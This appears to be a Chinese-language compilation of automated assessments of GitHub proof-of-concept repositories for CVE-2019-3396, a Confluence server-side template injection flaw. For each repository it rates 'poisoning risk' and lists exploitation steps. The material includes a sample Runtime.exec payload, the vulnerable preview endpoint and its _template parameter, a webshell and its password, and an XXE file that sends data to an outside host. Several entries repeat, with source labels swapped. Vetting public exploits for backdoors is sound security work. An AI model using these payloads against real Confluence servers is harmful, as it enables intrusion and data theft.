根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #12

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
